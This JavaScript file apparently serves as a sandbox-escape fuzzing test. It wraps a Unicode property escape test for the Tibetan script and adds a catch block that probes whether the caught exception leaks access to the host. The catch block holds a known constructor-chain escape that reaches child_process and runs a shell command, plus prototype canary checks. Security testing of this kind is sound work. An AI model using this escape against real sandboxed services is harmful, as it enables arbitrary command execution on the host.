try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                3840,
                3911
            ],
            [
                3913,
                3948
            ],
            [
                3953,
                3991
            ],
            [
                3993,
                4028
            ],
            [
                4030,
                4044
            ],
            [
                4046,
                4052
            ],
            [
                4057,
                4058
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script=Tibetan}+$/u, matchSymbols, '\\p{Script=Tibetan}');
    testPropertyEscapes(/^\p{Script=Tibt}+$/u, matchSymbols, '\\p{Script=Tibt}');
    testPropertyEscapes(/^\p{sc=Tibetan}+$/u, matchSymbols, '\\p{sc=Tibetan}');
    testPropertyEscapes(/^\p{sc=Tibt}+$/u, matchSymbols, '\\p{sc=Tibt}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [
            3912,
            3992,
            4029,
            4045
        ],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                3839
            ],
            [
                3949,
                3952
            ],
            [
                4053,
                4056
            ],
            [
                4059,
                56319
            ],
            [
                57344,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script=Tibetan}+$/u, nonMatchSymbols, '\\P{Script=Tibetan}');
    testPropertyEscapes(/^\P{Script=Tibt}+$/u, nonMatchSymbols, '\\P{Script=Tibt}');
    testPropertyEscapes(/^\P{sc=Tibetan}+$/u, nonMatchSymbols, '\\P{sc=Tibetan}');
    testPropertyEscapes(/^\P{sc=Tibt}+$/u, nonMatchSymbols, '\\P{sc=Tibt}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}